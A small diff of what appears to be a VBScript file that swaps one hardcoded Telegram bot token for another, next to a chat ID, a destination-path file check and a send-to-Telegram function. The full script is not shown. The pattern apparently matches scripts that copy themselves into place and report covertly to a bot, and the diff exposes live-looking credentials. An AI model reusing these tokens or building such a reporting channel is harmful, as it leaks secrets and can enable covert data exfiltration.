@@ -39,7 +39,7 @@ If Not objFSO.FileExists(strDestPath) Then
 End If
 
 ' Telegram Bot details
-botToken = "8193387679:AAEqON5mXie1nX7J3uNyenh99eDuLmfiZMc"
+botToken = "8193387679:AAGG3-UoQqRlTnrcBt7OxUJsB-cPUu8woPc"
 chatID = "7055058745"
 
 ' Function to send message to Telegram
